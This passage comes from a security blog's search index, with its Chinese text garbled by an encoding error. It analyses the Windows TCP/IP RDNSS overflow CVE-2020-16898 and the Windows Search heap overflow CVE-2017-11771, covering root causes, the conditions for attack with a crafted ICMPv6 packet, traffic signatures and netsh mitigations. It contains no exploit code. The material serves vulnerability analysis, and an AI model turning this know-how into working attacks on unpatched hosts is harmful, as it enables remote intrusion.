(DNSSL)ï¼šPv6ä¸»æœºåœ¨æ‰§è¡ŒDNSæŸ¥è¯¢æœç´¢æ—¶ä½¿ç”¨çš„DNSåç¼€åŸŸååˆ—è¡¨ï¼Œç”¨äºæœç´¢ç®€çŸ­çš„ä¸åˆæ ¼åŸŸåã€‚ DNSSL Optionï¼šä¸€ä¸ªIPv6 RAé€‰é¡¹ï¼Œç”¨äºå°†DNSSLä¿¡æ¯ä¼ é€’åˆ°IPv6ä¸»æœºã€‚ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:2","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"3. è¯¦ç»†åˆ†æ 1. åŸºç¡€åˆ†æ RFC8106æ ‡å‡†åŒ–äº†RDNSS optionï¼Œå…¶ä¸­åŒ…å«RDNSSesçš„åœ°å€ã€‚è¯¥ä¿¡æ¯ä½¿ç”¨ç°æœ‰ND message(ä¾‹å¦‚RA)ä½œä¸ºè½½ä½“ã€‚IPv6ä¸»æœºå¯ä»¥é€šè¿‡RAæ¶ˆæ¯é…ç½®ä¸€ä¸ªæˆ–å¤šä¸ªRDNSSçš„IPv6åœ°å€ã€‚ 1. é‚»å±…å‘ç°æ‰©å±• RFC8106ä¸­å®šä¹‰çš„åœ¨é‚»å±…å‘ç°ä¸­ä½¿ç”¨çš„IPv6 DNSé…ç½®ç®—æ³•éœ€è¦ç”¨åˆ°2ç§ND optionsï¼šRDNSS optionå’ŒDNSSL optionã€‚ä¸è¯¥æ¼æ´ç›¸å…³çš„æ˜¯RDNSS optionï¼Œå¦å¤–ä¸€ç§åˆ™ä¸ CVE-2020-16899ç›¸å…³ã€‚ 2. RDNSS Option Structure RDNSS optionæ€»ä½“ç»“æ„å¦‚ä¸‹ï¼š Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bitï¼ŒRDNSS option type identifierï¼Œ0x19 0x01 1 Length optioné•¿åº¦ï¼ˆåŒ…æ‹¬\"Type\"å’Œ\"Length\"å­—æ®µï¼‰ï¼Œä»¥8ä¸ªå…«ä½ä½ç»„ä¸ºå•ä½ã€‚ 0x02 2 Reserved ä¿ç•™å­—æ®µ 0x04 4 Lifetime RDNSSåœ°å€å¯ç”¨äºåç§°è§£æçš„æœ€é•¿æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ï¼ˆç›¸å¯¹äºæ¥æ”¶åŒ…çš„æ—¶é—´ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å€¼è‡³å°‘ä¸º3 * MaxRtrAdvIntervalï¼Œå…¶ä¸­MaxRtrAdvIntervalæ˜¯RFC4861ä¸­å®šä¹‰çš„æœ€å¤§RAé—´éš”ã€‚ 0xffffffffè¡¨ç¤ºæ— ç©·å¤§ï¼Œ é›¶å€¼æ„å‘³ç€å¿…é¡»ä¸å†ä½¿ç”¨RDNSSåœ°å€ã€‚ 0x08 16 Address of IPv6 Recursive DNS Servers ä¸€ä¸ªæˆ–å¤šä¸ª128ä½IPv6åœ°å€ã€‚ åœ°å€çš„æ•°é‡ç”±Lengthå­—æ®µç¡®å®šï¼šNumber of addresses = (Length - 1) / 2ã€‚ å¯¹äºLengthå­—æ®µï¼Œå¦‚æœè¯¥é€‰é¡¹ä¸­ä»…åŒ…å«ä¸€ä¸ªIPv6åœ°å€ï¼Œåˆ™æœ€å°å€¼ä¸º3ã€‚ æ¯å¢åŠ ä¸€ä¸ªRDNSSåœ°å€ï¼Œé•¿åº¦å°±ä¼šå¢åŠ 2ã€‚æ¥æ”¶çš„ä¸»æœºä½¿ç”¨è¯¥å­—æ®µæ¥ç¡®å®šé€‰é¡¹ä¸­IPv6åœ°å€çš„æ•°é‡ã€‚ 3. Procedure in IPv6 Hosts å½“ä¸»æœºæ¥æ”¶åˆ°RAæ¶ˆæ¯ä¸­çš„DNSçš„optionsæ—¶ï¼Œå…¶å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆæ£€æŸ¥Lenghå­—æ®µçš„åˆæ³•æ€§ï¼šæ˜¯å¦å¤§äºç­‰äºæœ€å°å€¼3ï¼Œä»¥åŠæ˜¯å¦æ»¡è¶³(Length - 1) % 2 == 0ï¼› å¯¹äºRDNSS optionï¼Œè¿˜ä¼šæ£€æŸ¥Addresså­—æ®µæ˜¯å¦ä¸ºä¸€ä¸ªå•æ’­åœ°å€ï¼› å¦‚æœä»¥ä¸ŠéªŒè¯é€šè¿‡ï¼Œåˆ™ä¸»æœºåº”æŒ‰é¡ºåºå°†é€‰é¡¹çš„å€¼å¤åˆ¶åˆ°DNSå­˜å‚¨åº“å’Œè§£æå™¨å­˜å‚¨åº“ä¸­ã€‚ å¦åˆ™ï¼Œä¸»æœºå¿…é¡»ä¸¢å¼ƒè¿™äº›é€‰é¡¹ã€‚ 4. Crashåˆ†æ é¦–å…ˆåˆ†ædmpæ–‡ä»¶ï¼ŒæŸ¥çœ‹crashç°åœºï¼š å¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„è¾ƒä¸ºæœ‰ä»·å€¼çš„Call Stackä¿¡æ¯ï¼Œä½†æ˜¯å‘ç°æœ€ç»ˆçš„crashåŸå› çš„æ˜¯GSæœºåˆ¶çš„Security Cookieæ ¡éªŒå¤±è´¥ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥å€¼è¢«è¦†ç›–æ‰äº†ã€‚é‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªæº¢å‡ºã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåªå‘ç°äº†tcpip!Ipv6pHandleRouterAdvertisement+0x1269å‡½æ•°ï¼Œå†å¾€åå°±ç›´æ¥æŠ¥gsfailureäº†ã€‚ 2. é™æ€åˆ†æ åˆ†æä½¿ç”¨çš„æ–‡ä»¶ä¸ºWindows 10 1809 x64çš„tcpip.sysæ–‡ä»¶ï¼Œç‰ˆæœ¬ä¸º10.0.17763.316ã€‚ 1. å‡½æ•°è°ƒç”¨é“¾ æ ¹æ®crashç°åœºä¿¡æ¯ï¼Œè·å–åˆ°å…³é”®å‡½æ•°tcpip!Ipv6pHandleRouterAdvertisement()ï¼Œé¦–å…ˆç¡®è®¤è¯¥å‡½æ•°åˆ°æ¼æ´å‡½æ•°çš„å‰åè°ƒç”¨é“¾ã€‚ é¦–å…ˆæŸ¥çœ‹å…¶äº¤å‰å¼•ç”¨å…³ç³»ï¼š å…¶ä¸Šå±‚è°ƒç”¨å‡½æ•°ä¸ºIcmpv6ReceiveDatagrams()ï¼Œè·Ÿè¿›ï¼Œå¹¶æŸ¥çœ‹äº¤å‰å¼•ç”¨å…³ç³»ï¼š æ²¡æœ‰å†å‘ç°æ˜¾å¼çš„å‡½æ•°è°ƒç”¨ã€‚è½¬è€Œå‘tcpip!Ipv6pHandleRouterAdvertisement()çš„ä¸‹å±‚æœç´¢ï¼š å‘ç°æ¼æ´å‡½æ•°è°ƒç”¨ã€‚è‡³æ­¤ï¼Œå‡½æ•°è°ƒç”¨é“¾å¯ä»¥ç®€å•æ¦‚æ‹¬ä¸ºï¼š Icmpv6ReceiveDatagrams() -\u003e tcpip!Ipv6pHandleRouterAdvertisement() -\u003e Ipv6pUpdateRDNSS() 2. æ¼æ´å‡½æ•°åˆ†æ ç»è¿‡ç®€å•åˆ†æå¯ä»¥æ˜ç¡®ï¼Œè°ƒç”¨é“¾çš„é¡¶å±‚å‡½æ•°Icmpv6ReceiveDatagrams()æ²¡æœ‰å‘ç°å®è´¨æ€§çš„ä¸è¯¥æ¼æ´ç›¸å…³çš„å¤„ç†ä»£ç ï¼Œè€Œåœ¨tcpip!Ipv6pHandleRouterAdvertisement() å‡½æ•°ä¸­å‘ç°äº†å¯¹æ¼æ´å‡½æ•°Ipv6pUpdateRDNSS()çš„è°ƒç”¨ã€‚æ ¹æ®crashåˆ†æï¼Œæœ€åæŠ¥äº†gsfailureï¼Œè€Œä¸”å…³é”®å‡½æ•°ä¸ºtcpip!Ipv6pHandleRouterAdvertisement()ï¼Œåœ¨è¯¥å‡½æ•°çš„èµ·å§‹ä½ç½®ç¡®å®å‘ç°äº†GSæ ¡éªŒï¼š é‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æ˜¯åœ¨æ¼æ´å‡½æ•°Ipv6pUpdateRDNSS()ä¸­å‘ç”Ÿäº†æº¢å‡ºï¼Œå¯¼è‡´äº†å…¶è°ƒç”¨å‡½æ•°tcpip!Ipv6pHandleRouterAdvertisement()çš„GSæ ¡éªŒå¤±è´¥ã€‚ è¿›å…¥æ¼æ´å‡½æ•°Ipv6pUpdateRDNSS()ï¼š NdisGetDataBuffer()å‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller. The buffer must be greater than or equal in size to the number of bytes specified in BytesNeeded . If this value is non-NULL, and the data requested is not contiguous, NDIS copies the requested data to the area indicated by Storage . UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. å¦‚æœNetBufferå‚æ•°æŒ‡å‘çš„NET_BUFFERç»“æ„ä¸­çš„NET_BUFFER_DATAéƒ¨åˆ†çš„DataLengthå­—æ®µçš„å€¼å°äºBytesNeededå‚æ•°çš„å€¼ï¼Œé‚£ä¹ˆå‡½æ•°è¿”å›NULLã€‚NET_BUFFERçš„ç»“æ„å¦‚ä¸‹ï¼š typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; é¦–å…ˆè·å–åˆ°RDNSS optionç»“æ„ï¼Œç„¶åè¯»å–Lengthå­—æ®µæ¥è®¡ç®—Addresså­—æ®µæœ‰å‡ ä¸ªAddresså€¼ã€‚ ç¡®è®¤æœ‰å¤šå°‘Addressä¹‹åï¼Œè¿›å…¥å¾ªç¯ï¼Œå¯¹æ¯ä¸ªAddressè¿›è¡Œå¤„ç†ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯å•æ’­åœ°å€ï¼Œç›´æ¥å¿½ç•¥ï¼š åœ¨ä¸Šé¢çš„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå‡è®¾Lengthçš„é•¿åº¦ä¸º4ï¼Œé‚£ä¹ˆè®¡ç®—ç»“æŸä¹‹åï¼ŒAddressCountçš„å€¼åº”è¯¥ä¸º1ã€‚æ­¤æ—¶ï¼ŒæŒ‰ç…§æ­£å¸¸é€»è¾‘ï¼ŒIpv6pUpdateRDNSS()å‡½æ•°åº”è¯¥å¢åŠ 32å­—èŠ‚ï¼ˆ4*8ï¼‰çš„ç¼“å†²åŒºï¼Œä½†æ˜¯åç»­åœ¨åˆ†é…ç¼“å†²åŒºæ—¶åªåˆ†é…äº†24å­—èŠ‚ï¼šsizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24ï¼Œä»è€Œå¯¼è‡´äº†ç¼“å†²åŒºçš„æº¢å‡ºã€‚ æ ¹æ®RFC8106çš„æ ‡å‡†ï¼ŒLengthå­—æ®µçš„å€¼åº”è¯¥æ»¡è¶³æœ€å°ä¸º3çš„å¥‡æ•°çš„æƒ…å†µã€‚å½“æä¾›ä¸€ä¸ªå¶æ•°Lengthå€¼æ—¶ï¼ŒWindows TCP/IPå †æ ˆé”™è¯¯åœ°å°†bufferå‰è¿›äº†8ä¸ªå­—èŠ‚ã€‚è¿™ä¸»è¦æ˜¯å› ä¸ºå †æ ˆåœ¨å†…éƒ¨ä»¥16å­—èŠ‚ä¸ºå¢é‡è¿›è¡Œè®¡æ•°ï¼Œå¹¶ä¸”æ²¡æœ‰ä½¿ç”¨éRFCå…¼å®¹é•¿åº¦å€¼çš„å¤„ç†ä»£ç ã€‚è¿™ç§ä¸åŒ¹é…å¯¼è‡´å †æ ˆå°†å½“å‰é€‰é¡¹çš„æœ€å8ä¸ªå­—èŠ‚è§£é‡Šä¸ºç¬¬äºŒä¸ªé€‰é¡¹çš„å¼€å§‹ï¼Œæœ€ç»ˆå¯¼è‡´","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:3","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"4. åˆ©ç”¨æ€è·¯ 1. åˆ©ç”¨æ¡ä»¶ åŸºæœ¬æ¡ä»¶ attackeréœ€è¦è·å–targetçš„IPv6å’ŒMACåœ°å€ è§¦å‘è¿‡ç¨‹ attackeréœ€è¦æ­é…å…¶ä»–å†…å­˜æ³„æ¼æˆ–ä¿¡æ¯æ³„æ¼æ¼æ´æ¥å®ç°RCE attackeréœ€è¦æƒ³åŠæ³•ç»•è¿‡tcpip.sysçš„GSä¿æŠ¤æœºåˆ¶ 2. åˆ©ç”¨è¿‡ç¨‹ attackerç›´æ¥å‘é€ç‰¹åˆ¶çš„ICMPv6è·¯ç”±å¹¿æ’­æ•°æ®åŒ…ç»™targetï¼š [ Attacker ] \u003c--------------------\u003e [ Target ] 3. æ”»å‡»å‘é‡ å»ºç«‹è¿æ¥åï¼Œåˆ©ç”¨IPv6ç›´æ¥å‘é€æ”»å‡»æ•°æ®åŒ…å³å¯ã€‚ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:4","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"5. æµé‡åˆ†æ å› ä¸ºè¯¥æ¼æ´ç›´æ¥èµ°çš„IPv6ï¼Œæ‰€ä»¥å¯¹äºä¸€äº›éƒ¨ç½²åœ¨IPå±‚ä»¥ä¸Šçš„é˜²ç«å¢™æ–¹æ¡ˆå°±æ— æ³•é’ˆå¯¹è¯¥æ¼æ´è¿›è¡Œæµé‡æ£€æµ‹ï¼Œä½†æ˜¯å…·å¤‡IPå±‚æµé‡æ£€æµ‹çš„é˜²ç«å¢™å¯ä»¥è½»æ¾æ£€æµ‹æ¶æ„æµé‡ï¼š åœ¨æµé‡ä¸­å¯ä»¥æ˜æ˜¾çœ‹å‡ºï¼Œç¬¬ä¸€ä¸ªOptionç»“æ„çš„Addresså­—æ®µé”™è¯¯è¯†åˆ«è®¡ç®—äº†ä¸€ä¸ªRecursive DNS Serverçš„å€¼ï¼š ç¬¬1ä¸ªRecursive DNS Serverçš„åœ°å€ä¸º0018-0027ï¼Œåç»­çš„8ä¸ªå­—èŠ‚ä¸åº”è¯¥å†è¿›è¡Œè¯†åˆ«ã€‚é€‰ä¸­ç¬¬2ä¸ªRecursive DNS Serveræ—¶æƒ…å†µå¦‚ä¸‹ï¼š ç¬¬2ä¸ªRecursive DNS Serverçš„åœ°å€ä¸º0028-0037ã€‚ä½†æ˜¯è¯¥16ä¸ªå­—èŠ‚ä¸­çš„å8ä¸ªå­—èŠ‚å¾ˆæ˜æ˜¾ä¸ºä¸‹ä¸€ä¸ªICMPv6 Optionç»“æ„çš„å†…å®¹ï¼š ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:5","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"å››ã€ç¼“è§£æªæ–½ ç®¡ç†å‘˜å¯åŠ¨powershellæˆ–cmdï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æ‰€æœ‰ç½‘ç»œIPv6æ¥å£çš„åˆ—è¡¨ä»¥åŠç›¸åº”çš„ç´¢å¼•å·ï¼š netsh int ipv6 sh int æ ·ä¾‹è¾“å‡ºå¦‚ä¸‹ï¼š ç¡®è®¤ç½‘ç»œæ¥å£çš„RDNSSåŠŸèƒ½å¼€å¯æƒ…å†µï¼š netsh int ipv6 sh int Idx number æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å…³é—­RDNSSåŠŸèƒ½(å°†Idx numberæ›¿æ¢ä¸ºè¦å…³é—­çš„ç½‘ç»œæ¥å£çš„Idxå€¼)ï¼š netsh int ipv6 set int Idx number rabaseddnsconfig=disable æ ·ä¾‹è¾“å‡ºå¦‚ä¸‹ï¼š æ­¤æ—¶å†æ¬¡ç¡®è®¤æ¥å£çš„RDNSSå¼€å¯æƒ…å†µï¼ŒRDNSSåŠŸèƒ½å·²è¢«å…³é—­ï¼š ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:4:0","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"äº”ã€å‚è€ƒæ–‡çŒ® https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 https://tools.ietf.org/html/rfc8106 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:5:0","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:0:0","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"ä¸€ã€æ¼æ´ä¿¡æ¯ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:0","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. æ¼æ´ç®€è¿° æ¼æ´åç§°ï¼šWindows Search å †æº¢å‡ºæ¼æ´ æ¼æ´ç¼–å·ï¼šCVE-2017-11771ï¼›Bugtraq IDï¼š101114 æ¼æ´ç±»å‹ï¼šRemote Code Execution ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:1","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. ç»„ä»¶æ¦‚è¿° Windowsæœç´¢æ˜¯ä¸€ä¸ªæ¡Œé¢æœç´¢å¹³å°ï¼Œå…·æœ‰é’ˆå¯¹å¤§å¤šæ•°å¸¸è§æ–‡ä»¶ç±»å‹å’Œæ•°æ®ç±»å‹çš„å³æ—¶æœç´¢åŠŸèƒ½ã€‚ å®ƒçš„ä¸»è¦ç»„ä»¶æ˜¯WSearch Windows Serviceï¼Œå®ƒè´Ÿè´£ç´¢å¼•ï¼Œç»„ç»‡å’Œæå–æœ‰å…³æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ã€‚ æ­¤å¤–ï¼Œå®ƒå®ç°äº†é€šç”¨æœç´¢æœåŠ¡ï¼ˆGSSï¼‰ï¼Œå®ƒæ˜¯å‘æœç´¢æŸ¥è¯¢æä¾›ç»“æœæ‰€éœ€çš„åç«¯åŠŸèƒ½ã€‚ å®¢æˆ·ç«¯ä½¿ç”¨Windowsæœç´¢åè®®ï¼ˆWSPï¼‰å‘æ‰˜ç®¡GSSçš„æœåŠ¡å™¨å‘å‡ºæŸ¥è¯¢ã€‚ WSPä¾é åä¸ºç®¡é“åè®®çš„æœåŠ¡å™¨æ¶ˆæ¯å—ï¼ˆSMBï¼‰è¿›è¡Œæ¶ˆæ¯ä¼ è¾“å’Œèº«ä»½éªŒè¯ã€‚ Microsoft Windowsçš„æ‰€æœ‰ç‰ˆæœ¬å‡é™„å¸¦æœåŠ¡å™¨æ¶ˆæ¯å—ï¼ˆSMBï¼‰åè®®çš„å®ç°ã€‚ SMBæ˜¯æœ¬æœºWindowsç½‘ç»œæ¡†æ¶ï¼Œæ”¯æŒæ–‡ä»¶å…±äº«ï¼Œç½‘ç»œæ‰“å°ï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨å’Œå…¶ä»–åŠŸèƒ½ã€‚åœ¨Windowsç³»ç»Ÿä¸Šï¼ŒSMBåè®®é€šè¿‡é™„åŠ çš„å®‰å…¨æ€§ï¼Œæ–‡ä»¶å’Œç£ç›˜ç®¡ç†æ”¯æŒæ‰©å±•äº†CIFSåè®®ã€‚ é€šè¿‡å„ç§SMBå‘½ä»¤å’Œå­å‘½ä»¤ç±»å‹æä¾›è¿™äº›åŠŸèƒ½ã€‚ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:2","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"3. æ¼æ´åˆ©ç”¨ Windows SearchæœåŠ¡åœ¨å¤„ç†å†…å­˜ä¸­çš„å¯¹è±¡æ—¶å­˜åœ¨ç¼ºé™·ï¼Œä¼šé€ æˆå †æº¢å‡ºã€‚è¿œç¨‹æœªç»è¿‡è®¤è¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ä¸»æœºå‘èµ·ä¸€ä¸ªæ¶æ„è¯·æ±‚å®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼ŒæˆåŠŸçš„æ”»å‡»å¯ä»¥è·å¾—ç›®æ ‡ä¸»æœºçš„SYSTEMæƒé™ã€‚ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:3","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"4. æ¼æ´å½±å“ç‰ˆæœ¬ â€¢ Microsoft Windows 7 â€¢ Microsoft Windows 8 â€¢ Microsoft Windows 8.1 â€¢ Microsoft Windows 10 â€¢ Microsoft Windows Server 2003 â€¢ Microsoft Windows Server 2008 â€¢ Microsoft Windows Server 2012 â€¢ Microsoft Windows Server 2016 â€¢ Microsoft Windows Vista â€¢ Microsoft Windows XP ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:4","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"5. è§£å†³æ–¹æ¡ˆ è·å–å¾®è½¯å®˜æ–¹é’ˆå¯¹æ­¤æ¼æ´çš„å®‰å…¨è¡¥ä¸ï¼Œåœ°å€ï¼š https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11771 ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:1:5","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"äºŒã€æ¼æ´å¤ç° æš‚æ—  ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:2:0","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. ç¯å¢ƒæ­å»º ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:2:1","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. å¤ç°è¿‡ç¨‹ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:2:2","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"ä¸‰ã€æ¼æ´åˆ†æ ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:0","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"1. æ¼æ´åŸºæœ¬ä¿¡æ¯ æ¼æ´æ–‡ä»¶ï¼štquery.dll æ¼æ´å‡½æ•°ï¼šCFixedVarBufferAllocator::CFixedVarBufferAllocator() æ¼æ´å‚æ•°ï¼šcbReadBuffer and cbReserved æ¼æ´å¯¹è±¡ï¼šå †åˆ†é…çš„buffer ","date":"2020-10-19","objectID":"/2020/10/cve-2017-11771/:3:1","tags":["æ¼æ´"],"title":"CVE-2017-11771 Windows Search å †æº¢å‡ºæ¼æ´ç®€å•åˆ†æ","uri":"/2020/10/cve-2017-11771/"},{"categories":["Vuln"],"content":"2. èƒŒæ™¯çŸ¥è¯† å¤‡æ³¨ï¼šæ­¤å¤„ç•¥å»SMBç›¸å…³ä»‹ç»ï¼Œæ¼æ´è‡ªèº«ä¸SMBå…³ç³»ä¸å¤§ï¼ŒSMBåªæ˜¯ä½œä¸ºWSPä¼ è¾“çš„å·¥å…·åè®®ï¼Œä½¿ç”¨çš„pipeåç§°ä¸ºMsFteWdsã€‚ Windows Search Protocol(WSP) ä½¿ç”¨WSPçš„æœ€å°æœç´¢æŸ¥è¯¢å…¶æµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼š [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectInæ¶ˆæ¯å¼€å§‹äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ä¼šè¯ï¼ŒCPMCreateQueryInåŒ…å«æŸ¥è¯¢æ¡ä»¶å¹¶åˆ›å»ºæ–°æŸ¥è¯¢ï¼ŒCPMSetBindingsInæŒ‡å®šå¦‚ä½•åœ¨CPMGetRowsOutä¸­æ„å»ºæœç´¢ç»“æœï¼ŒCPMGetRowsInä»æœåŠ¡å™¨è¿”å›çš„æŸ¥è¯¢ç»“æœä¸­è¯·æ±‚æ•°æ®ã€‚ æ‰€æœ‰çš„WSPæ¶ˆæ¯ä»¥ä¸€ä¸ª16å­—èŠ‚çš„å¤´éƒ¨å¼€å§‹ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msgå­—æ®µæ ‡è¯†æ ‡å¤´éƒ¨åé¢çš„æ¶ˆæ¯ç±»å‹ï¼ˆæœ‰çš„ä¸€ä¸ªvalueè¡¨ç¤ºä¸¤ç§ç±»å‹ï¼Œæ­¤æ—¶è¦æ ¹æ®æ•°æ®æµçš„ä¼ 